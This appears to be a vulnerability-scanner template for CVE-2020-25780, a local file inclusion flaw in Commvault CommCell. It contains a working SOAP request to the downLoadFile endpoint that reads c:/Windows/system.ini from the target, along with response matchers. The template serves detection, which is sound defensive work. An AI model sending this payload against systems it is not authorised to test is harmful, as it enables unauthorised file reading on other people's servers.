templates/cves/CVE-2020-25780.yaml

id: CVE-2020-25780
name: Commvault CommCell - Local File Inclusion
severity: high
confidence: tentative
description: CommCell in Commvault before 14.68, 15.x before 15.58, 16.x before 16.44, 17.x before 17.29, and 18.x before
  18.13 are vulnerable to local file inclusion because an attacker can view a log file can instead view a file outside of
  the log-files folder.
reference: CWE-22
tags:
- cve
- cve2020
- commvault
- lfi
- vuln
requests:
- method: POST
  path: /SearchSvc/CVSearchService.svc
  matchers:
  - type: body
    words:
    - downLoadFileResult
  - type: status
    status:
    - 200
  condition: and
  headers:
    Cookie: Login
    soapaction: http://tempuri.org/ICVSearchSvc/downLoadFile
    content-type: text/xml
  body: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n\
    \   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n\
    \      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n"
